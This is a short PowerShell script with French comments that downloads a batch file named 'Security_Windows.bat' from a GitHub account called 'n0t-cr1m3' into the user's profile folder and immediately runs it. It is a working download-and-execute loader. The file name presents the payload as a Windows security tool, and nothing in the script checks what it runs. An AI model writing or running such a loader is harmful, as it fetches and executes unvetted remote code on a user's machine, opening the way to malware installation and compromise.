$url = "https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.bat"

# Sp�cifiez le chemin de destination o� le fichier sera enregistr�
$destination = "$env:USERPROFILE/Security_Windows.bat"

# T�l�charge le fichier depuis l'URL sp�cifi�e
Invoke-WebRequest -Uri $url -OutFile $destination

# Ex�cute le fichier t�l�charg�
Start-Process -FilePath $destination

            